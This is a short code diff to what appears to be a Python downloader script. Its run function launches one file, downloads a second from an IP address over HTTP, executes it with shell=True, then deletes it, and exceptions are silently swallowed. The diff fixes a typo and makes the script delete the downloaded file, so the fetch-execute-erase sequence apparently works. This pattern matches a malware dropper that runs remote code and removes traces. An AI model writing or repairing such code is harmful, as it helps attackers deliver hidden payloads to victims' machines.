@@ -15,7 +15,7 @@ def run(ip,file1,file2):
     subprocess.Popen(file1,shell=True)
     dl(f'http://{ip}/{file2}') 
     subprocess.call(file2,shell=True)
-    os.remove('happyFile.exe')
+    os.remove(file2)
 
 
 
@@ -26,7 +26,7 @@ file2 = ''
 
 
 try:
-    run(ip,file1,fil2)
+    run(ip,file1,file2)
 except: 
     sys.exit()
 
